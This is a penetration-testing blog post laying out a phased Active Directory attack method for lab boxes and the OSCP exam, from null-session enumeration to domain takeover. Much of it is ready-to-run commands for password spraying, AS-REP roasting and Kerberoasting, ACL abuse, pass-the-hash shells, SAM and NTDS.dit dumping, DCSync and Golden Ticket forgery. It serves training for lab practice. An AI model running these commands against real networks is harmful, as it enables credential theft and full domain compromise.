---
title: "AD Attack Methodology — From Zero to Domain Admin"
date: 2026-03-24
weight: 20
draft: false
tags: ["active-directory", "methodology", "bloodhound", "kerberos"]
summary: "The attack chain from an AD box to Domain Admin. Summarizes the decision order after initial foothold."
---

Every AD box follows the same pattern. Starting with nothing, you find a gap, widen it, and take over the domain. The chain itself is predictable. What varies is where each link breaks.

This is the methodology I follow on every AD box. It's not theory; I put it together while working through boxes like Active, Forest, and Blackfield.

---

## Phase 0 — Setup

Before touching the box. A 30-second setup that saves you 30 minutes of confusion later.

### Add the domain to /etc/hosts

```bash
echo "$IP domain.htb dc01.domain.htb" | sudo tee -a /etc/hosts
```

**Add both the domain name and the DC hostname.** Kerberos authentication requires exact hostname resolution. If a tool throws weird errors, check /etc/hosts first. I've lost time to this more than once.

### Clock sync

```bash
sudo ntpdate -s $IP
```

Kerberos is time-sensitive. If your clock drifts more than 5 minutes from the DC, authentication fails with no useful error message. Sync before you start.

### Create working directories

```bash
mkdir -p {scans,loot,bloodhound}
```

Output piles up fast. If you don't organize it, it gets buried.

---

## Phase 1 — No Credentials

You have nothing. The goal is simple: **one username, one password, anything.**

### 1.1 — Null Session Enumeration

Try everything that works without authentication. Something always answers.

```bash
# SMB null session
crackmapexec smb $IP -u '' -p ''
smbclient -N -L //$IP/
smbmap -H $IP -u '' -p ''

# RPC null session
rpcclient -U '' -N $IP
> enumdomusers
> enumdomgroups
> querydispinfo

# LDAP anonymous bind
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=htb"
```

**What I'm after:** usernames. That's the top priority. One valid username opens the door.

**On Forest**, null RPC gave the full user list. That was the entire foothold — AS-REP Roasting one of those users.

### 1.2 — User Enumeration via Kerberos

If null sessions return nothing, Kerberos can often confirm valid usernames without locking anything out.

```bash
kerbrute userenum -d domain.htb --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Valid users return a different response than invalid ones. No lockout risk. No failed logon events for valid users.

### 1.3 — AS-REP Roasting (Pre-Auth Disabled)

As soon as you have a username — even just a few — try this immediately.

```bash
impacket-GetNPUsers domain.htb/ -dc-ip $IP -usersfile users.txt -no-pass -format hashcat
```

If the account has "Do not require Kerberos preauthentication" set, you get a hash. Crack it.

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

**This was the path on Forest.** null RPC → user list → AS-REP Roast → first credential. Clean chain.

### 1.4 — SMB Share Enumeration (Guest/Anonymous)

Some shares are readable without credentials. Or guest access.

```bash
smbmap -H $IP -u 'guest' -p ''
crackmapexec smb $IP -u 'guest' -p '' --shares
```

**On Active**, the `Replication` share was readable anonymously. The `Groups.xml` file contained a GPP password. That was the foothold.

**Always download and inspect everything readable in a share:**

```bash
smbget -R smb://$IP/sharename/
```

Look for:

- **GPP files** (`Groups.xml`) — contain encrypted passwords, decryptable with `gpp-decrypt`

- **Scripts** — logon scripts, batch files, PowerShell scripts with hardcoded credentials

- **Config files** — web.config, connection strings, anything with credentials

- **Documents** — password policies, default passwords, onboarding docs

### 1.5 — SNMP Walk

If UDP 161 is open:

```bash
snmpwalk -v2c -c public $IP 1.3.6.1
```

SNMP can dump running processes, installed software, and sometimes command lines containing credentials.

### 1.6 — DNS Zone Transfer

```bash
dig axfr @$IP domain.htb
```

Reveals subdomains, hostnames, and sometimes other DCs or servers you didn't know about.

### Decision Point — End of Phase 1

Got credentials → Phase 2. Only have usernames, no passwords → password spray.

```bash
# Password spraying (watch the lockout policy!)
crackmapexec smb $IP -u users.txt -p 'Season2026!' --continue-on-success
```

**Passwords to try:** `Welcome1`, `Password123`, `CompanyName2026!`, `Season+Year+!`. If possible, check the password policy first:

```bash
crackmapexec smb $IP -u '' -p '' --pass-pol
```

Nothing? → Check the web services and other attack vectors. Sometimes the AD foothold comes through a web app on the same box.

---

## Phase 2 — First Credentials

You have a domain username and password. The game changes completely.

### 2.1 — Verify and Test Access

First, check what your credentials can do.

```bash
# Test credentials against multiple services
crackmapexec smb $IP -u 'user' -p 'password'
crackmapexec winrm $IP -u 'user' -p 'password'
crackmapexec mssql $IP -u 'user' -p 'password'
crackmapexec ldap $IP -u 'user' -p 'password'
```

If you see the `(Pwn3d!)` tag on WinRM, you have shell access. If you see it → immediately `evil-winrm`.

```bash
evil-winrm -i $IP -u 'user' -p 'password'
```

### 2.2 — BloodHound Collection

**Run this as soon as you get valid credentials.** Don't wait. Do it now.

```bash
bloodhound-python -u 'user' -p 'password' -d domain.htb -ns $IP -c all
```

This collects users, groups, sessions, ACLs, trusts — everything. Import the JSON files into BloodHound.

**What to look for in BloodHound:**

1. "Shortest Path to Domain Admin" — the obvious first check

2. "Shortest Path from Owned Principals" — mark your own user as owned first

3. Kerberoastable accounts — check which SPNs exist

4. Users with DCSync rights

5. Accounts with dangerous permissions — GenericAll, GenericWrite, WriteDACL, ForceChangePassword, AddMember

**On Blackfield**, BloodHound showed that a user I controlled had `ForceChangePassword` rights over another account. That was the full privilege escalation path. Finding it manually would have taken a long time.

### 2.3 — Kerberoasting

Now you're authenticated. Target service accounts with SPNs.

```bash
impacket-GetUserSPNs domain.htb/user:password -dc-ip $IP -request -outputfile kerberoast.hash
```

Crack the hash:

```bash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

Service accounts often have weak passwords and high privileges. **On Active**, Kerberoasting the Administrator account's SPN gave the domain. From first credential straight to DA.

**Crack priority:** accounts that are Domain Admins or have admin-level access (BloodHound will tell you).

### 2.4 — Authenticated Share Enumeration

Now more shares are visible.

```bash
smbmap -H $IP -u 'user' -p 'password'
crackmapexec smb $IP -u 'user' -p 'password' --shares
```

Find new shares you couldn't see before. SYSVOL and NETLOGON are always worth checking:

```bash
smbclient //$IP/SYSVOL -U 'user%password'
smbclient //$IP/NETLOGON -U 'user%password'
```

SYSVOL holds Group Policy, NETLOGON holds logon scripts. Both can contain credentials.

### 2.5 — Authenticated LDAP Dump

```bash
# All users with detailed attributes
ldapsearch -x -H ldap://$IP -D "[email protected]" -w 'password' -b "DC=domain,DC=htb" '(objectClass=person)' sAMAccountName description memberOf servicePrincipalName

# Computers
ldapsearch -x -H ldap://$IP -D "[email protected]" -w 'password' -b "DC=domain,DC=htb" '(objectClass=computer)' cn operatingSystem
```

Check the description field. Admins put passwords there more often than you'd think.

### 2.6 — ACL Abuse

BloodHound found dangerous permissions? Now exploit them.

**GenericAll on a user:**

```bash
# Password reset
net rpc password "targetuser" "NewPass123!" -U "domain.htb/user%password" -S $IP
```

**GenericWrite on a user:**

```bash
# Set SPN for targeted Kerberoasting
impacket-addspn -u 'domain.htb/user' -p 'password' -t 'targetuser' -s 'HTTP/fake' "dc01.domain.htb"
# Then Kerberoast them
```

**WriteDACL:**

```bash
# Grant yourself DCSync rights
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'user' -target-dn 'DC=domain,DC=htb' "domain.htb/user:password"
```

**ForceChangePassword:**

```bash
rpcclient -U 'user%password' $IP
> setuserinfo2 targetuser 23 'NewPass123!'
```

**AddMember on a group:**

```bash
net rpc group addmem "Target Group" "user" -U "domain.htb/user%password" -S $IP
```

### Decision Point — End of Phase 2

Got admin credentials → Phase 4 (domain takeover). Got another user's credentials → repeat Phase 2 with the new user and check what they can access. Local admin on any machine → Phase 3 (lateral movement). Stuck → recheck BloodHound. Try different queries. Look at group memberships more closely.

---

## Phase 3 — Lateral Movement

You have credentials (password or hash) and need to move to another machine.

### 3.1 — Tool Selection

**Decision tree for remote execution:**

- **Password + WinRM open (5985)?** → `evil-winrm` (cleanest shell)

- **Hash + WinRM open?** → `evil-winrm -H <hash>` (Pass the Hash)

- **Password + no WinRM?** → `impacket-psexec` (needs admin, drops to SYSTEM)

- **Hash + no WinRM?** → `impacket-psexec -hashes :NTLM_HASH` (PtH)

- **Need to be stealthy?** → `impacket-wmiexec` (quieter than psexec)

- **psexec fails?** → `impacket-smbexec` or `impacket-atexec` as alternatives

```bash
# Evil-WinRM with password
evil-winrm -i $TARGET -u 'admin' -p 'password'

# Evil-WinRM with hash (Pass the Hash)
evil-winrm -i $TARGET -u 'admin' -H 'NTLM_HASH'

# PsExec with password
impacket-psexec domain.htb/admin:password@$TARGET

# PsExec with hash
impacket-psexec -hashes :NTLM_HASH domain.htb/admin@$TARGET

# WMIExec (quieter)
impacket-wmiexec domain.htb/admin:password@$TARGET
```

### 3.2 — Credential Harvesting from Compromised Host

Once on a machine, collect everything.

```bash
# SAM dump (local accounts)
impacket-secretsdump admin:password@$TARGET

# Or from a shell:
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Download, then extract offline:
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

**What to look for:**

- Local admin hashes (reused across machines?)

- Cached domain credentials

- LSA secrets

### 3.3 — Credential Reuse

The #1 lateral movement technique. Try every credential you have on every machine.

```bash
# Spray the hash across all hosts
crackmapexec smb targets.txt -u 'admin' -H 'NTLM_HASH' --continue-on-success
```

Local admin password reuse is very common. One hash can get you multiple machines.

### 3.4 — Token / Session Abuse (From Shell)

When you have a shell on a machine where a privileged user has logged in:

```powershell
# Check tokens (needs SeImpersonatePrivilege)
# Use tools like Rubeus, Incognito, PrintSpoofer
whoami /priv
```

If you have `SeImpersonatePrivilege` → Potato attacks for SYSTEM (PrintSpoofer, GodPotato, etc.).

---

## Phase 4 — Domain Takeover

You have Domain Admin-level access. Now prove it.

### 4.1 — DCSync

The cleanest way to dump all domain hashes. Requires replication rights (Domain Admins have them by default).

```bash
impacket-secretsdump domain.htb/admin:password@$DC_IP
```

This dumps:

- **All domain user NTLM hashes** (including krbtgt)

- **All domain computer hashes**

- **Kerberos keys**

You need the `Administrator` NTLM hash and the `krbtgt` hash.

```bash
# DCSync only Administrator
impacket-secretsdump -just-dc-user Administrator domain.htb/admin:password@$DC_IP

# DCSync only krbtgt (for Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt domain.htb/admin:password@$DC_IP
```

### 4.2 — NTDS.dit Extraction

Alternative to DCSync. Grab the database file directly.

```bash
# From an admin shell on the DC
# create shadow copy
vssadmin create shadow /for=C:

# copy NTDS.dit from the shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system.bak

# Download both files, then extract offline
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
```

### 4.3 — Golden Ticket

With the `krbtgt` hash you can forge tickets for any user. Persistence that survives password resets until krbtgt is reset.

```bash
# Get the domain SID
impacket-lookupsid domain.htb/admin:password@$DC_IP

# Forge the Golden Ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain domain.htb Administrator

# Use it
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.htb/[email protected]
```

On OSCP, DCSync alone is usually enough to prove domain takeover. Golden Ticket is good to understand but overkill for most exam scenarios.

### 4.4 — Pass the Hash to Domain Controller

If you have the DA NTLM hash, just use it directly.

```bash
# Shell on the DC
impacket-psexec -hashes :DA_NTLM_HASH domain.htb/Administrator@$DC_IP
evil-winrm -i $DC_IP -u 'Administrator' -H 'DA_NTLM_HASH'
```

The simplest path. DCSync hash → PtH → shell on DC → proof.txt.

---

## Full Chain — Visualized

```gdscript3
Phase 1 (No Creds)
├── Null sessions → usernames
├── Kerberos user enum → usernames
├── AS-REP Roasting → password hash
├── Anonymous shares → credentials/info
├── SNMP/DNS → info gathering
└── Password spraying → first creds
         │
         ▼
Phase 2 (First Creds)
├── BloodHound → attack paths
├── Kerberoasting → service account hashes
├── Share enumeration → more creds/info
├── LDAP dump → users, descriptions, groups
├── ACL abuse → privilege escalation
└── Credential reuse → more access
         │
         ▼
Phase 3 (Lateral Movement)
├── Pass the Hash → other machines
├── Evil-WinRM → shells
├── PsExec/WMIExec → shells
├── SAM/LSA dumps → more hashes
└── Token abuse → higher privileges
         │
         ▼
Phase 4 (Domain Compromise)
├── DCSync → all hashes
├── NTDS.dit → offline extraction
├── Golden Ticket → persistence
└── PtH as DA → proof.txt
```

---

## Common Mistakes I've Made on AD Boxes

1. **Not running BloodHound immediately.** I used to get credentials and enumerate manually. BloodHound shows paths that would take hours manually in seconds. Run it first. Always.

2. **Forgetting time sync.** Clock drift makes Kerberos tools fail silently or with cryptic errors. Run `ntpdate` before you start.

3. **Not checking ACLs.** The path to DA is often through ACL abuse, not a direct exploit. BloodHound's edge analysis is gold.

4. **Trying to crack everything.** Not every Kerberoast hash cracks. If rockyou doesn't crack it in 5 minutes, move on and look for another path.

5. **Ignoring password reuse.** Every credential set should be tested against every service and every machine. `crackmapexec` with `--continue-on-success` against all discovered hosts.

6. **Not adding discovered hostnames to /etc/hosts.** Any hostname you discover from BloodHound or LDAP — add it. Some tools require exact name resolution.

---

## Cheat Sheet — Tools by Phase

| Phase | Tool | Purpose |
| --- | --- | --- |
| 0 | ntpdate | Clock sync |
| 1 | crackmapexec | Null session, spraying |
| 1 | kerbrute | User enumeration |
| 1 | impacket-GetNPUsers | AS-REP Roasting |
| 1 | enum4linux | SMB enumeration |
| 2 | bloodhound-python | AD data collection |
| 2 | impacket-GetUserSPNs | Kerberoasting |
| 2 | ldapsearch | LDAP enumeration |
| 2 | smbmap | Share enumeration |
| 3 | evil-winrm | Remote shell (WinRM) |
| 3 | impacket-psexec | Remote shell (SMB) |
| 3 | impacket-wmiexec | Remote shell (WMI) |
| 3 | impacket-secretsdump | Credential dump |
| 4 | impacket-secretsdump | DCSync |
| 4 | impacket-ticketer | Golden Ticket |

---

The chain is always the same: **enumerate → find a gap → escalate → repeat until DA.** What varies is where you find each gap. BloodHound and systematic enumeration find it faster than guessing.

- [Active-Directory](https://heretek.dev/tags/active-directory/)
- [Methodology](https://heretek.dev/tags/methodology/)
- [Bloodhound](https://heretek.dev/tags/bloodhound/)
- [Kerberos](https://heretek.dev/tags/kerberos/)